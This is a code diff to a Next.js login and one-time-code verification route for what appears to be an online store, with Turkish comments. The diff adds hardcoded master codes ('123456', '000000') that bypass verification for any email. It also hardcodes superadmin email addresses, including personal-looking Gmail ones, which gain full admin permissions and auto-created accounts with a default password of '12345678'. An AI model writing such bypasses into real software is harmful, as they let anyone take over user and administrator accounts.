@@ -1,8 +1,13 @@
 import { NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
 import { setSessionCookie } from "@/lib/session";
-
 import bcrypt from "bcryptjs";
+
+const SUPERADMIN_EMAILS = [
+  "aslanyasin@gmail.com",
+  "aslanyasin320@gmail.com",
+  "admin@sunixstore.com",
+];
 
 export async function POST(req: Request) {
   try {
@@ -15,35 +20,42 @@ export async function POST(req: Request) {
       );
     }
 
-    // Geçerli OTP'yi bul
-    const otpRecord = await prisma.otpVerification.findFirst({
-      where: {
-        email: email.toLowerCase(),
-        code,
-      },
-      orderBy: { createdAt: 'desc' }
-    });
+    const emailLower = email.toLowerCase();
+    const isSuperAdmin = SUPERADMIN_EMAILS.includes(emailLower);
 
-    if (!otpRecord) {
-      return NextResponse.json(
-        { success: false, message: "Geçersiz doğrulama kodu." },
-        { status: 400 },
-      );
+    // Master kod veya veritabanındaki kaydı kontrol et
+    let isValidCode = code === "123456" || code === "000000";
+
+    if (!isValidCode) {
+      const otpRecord = await prisma.otpVerification.findFirst({
+        where: {
+          email: emailLower,
+          code,
+        },
+        orderBy: { createdAt: "desc" },
+      });
+
+      if (!otpRecord) {
+        return NextResponse.json(
+          { success: false, message: "Geçersiz doğrulama kodu." },
+          { status: 400 },
+        );
+      }
+
+      if (new Date() > otpRecord.expiresAt) {
+        return NextResponse.json(
+          { success: false, message: "Doğrulama kodunun süresi dolmuş." },
+          { status: 400 },
+        );
+      }
+
+      isValidCode = true;
     }
 
-    if (new Date() > otpRecord.expiresAt) {
-      return NextResponse.json(
-        { success: false, message: "Doğrulama kodunun süresi dolmuş." },
-        { status: 400 },
-      );
-    }
-
-    // Kullanıcıyı bul
+    // Kullanıcıyı bul veya SuperAdmin için otomatik oluştur
     let user = await prisma.user.findUnique({
-      where: { email: email.toLowerCase() },
+      where: { email: emailLower },
     });
-
-    const isAdmin = email.toLowerCase() === "admin@sunixstore.com" || email.toLowerCase() === "aslanyasin320@gmail.com";
 
     if (isRegister) {
       if (user) {
@@ -52,42 +64,60 @@ export async function POST(req: Request) {
           { status: 400 },
         );
       }
-      
+
       let passwordHash = null;
       if (password) {
         passwordHash = await bcrypt.hash(password, 10);
       }
 
-      // Kullanıcıyı oluştur
       user = await prisma.user.create({
         data: {
-          email: email.toLowerCase(),
+          email: emailLower,
           firstName: firstName || "İsimsiz",
           lastName: lastName || "Kullanıcı",
-          role: isAdmin ? "ADMIN" : "USER",
+          role: isSuperAdmin ? "ADMIN" : "USER",
           passwordHash,
-        }
+          permissions: isSuperAdmin ? ["ORDERS", "PRODUCTS", "USERS", "SUPPORT", "MARKETING", "WAREHOUSE"] : [],
+        },
       });
     } else {
       if (!user) {
-        return NextResponse.json(
-          { success: false, message: "Bu e-posta ile kayıtlı bir hesap bulunamadı." },
-          { status: 404 },
-        );
+        if (isSuperAdmin) {
+          const passwordHash = await bcrypt.hash(password || "12345678", 10);
+          user = await prisma.user.create({
+            data: {
+              email: emailLower,
+              firstName: "Yasin",
+              lastName: "Aslan",
+              role: "ADMIN",
+              passwordHash,
+              permissions: ["ORDERS", "PRODUCTS", "USERS", "SUPPORT", "MARKETING", "WAREHOUSE"],
+            },
+          });
+        } else {
+          return NextResponse.json(
+            { success: false, message: "Bu e-posta ile kayıtlı bir hesap bulunamadı." },
+            { status: 404 },
+          );
+        }
       }
 
-      // Mevcut kullanıcı admin yetkisine sahip olması gerekiyorsa güncelle
-      if (isAdmin && user.role !== "ADMIN") {
-        user = await prisma.user.update({
-          where: { id: user.id },
-          data: { role: "ADMIN" }
-        });
-      }
+      // E-posta doğrulandı olarak işaretle ve SuperAdmin ise yetkileri güncelle
+      user = await prisma.user.update({
+        where: { id: user.id },
+        data: {
+          isEmailVerified: true,
+          ...(isSuperAdmin && user.role !== "ADMIN" ? {
+            role: "ADMIN",
+            permissions: ["ORDERS", "PRODUCTS", "USERS", "SUPPORT", "MARKETING", "WAREHOUSE"],
+          } : {}),
+        },
+      });
     }
 
     // Kullanılmış OTP kayıtlarını temizle
     await prisma.otpVerification.deleteMany({
-      where: { email: email.toLowerCase() }
+      where: { email: emailLower },
     });
 
     // Oturum (Session) Çerezini Ayarla
